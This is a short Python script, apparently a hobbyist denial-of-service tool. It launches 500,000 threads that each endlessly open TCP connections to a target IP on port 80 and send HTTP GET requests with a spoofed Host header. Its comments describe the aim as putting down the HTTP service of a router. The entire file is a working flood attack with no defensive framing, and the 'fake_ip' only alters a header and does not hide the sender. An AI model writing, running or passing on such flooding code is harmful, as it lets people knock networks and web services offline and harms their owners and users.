import threading
import socket


#need to know the inside ip of my router, default gateway
target_ip = 'ip_address'
#we can choose which service to put down,
# port number 80 puts down the http service
port = 80

fake_ip = 'ip_address'


#for counting the number of conecitons
already_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.sendto(("GET /" + target_ip + "HTTP/1.1\r\n").encode('ascii'),(target_ip,port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target_ip,port))
        s.close()

        global already_connected
        already_connected += 1
        print(already_connected)

        if(already_connected == 500000):
            print(already_connected)



for i in range(500000):
    thread = threading.Thread(target = attack)
    thread.start()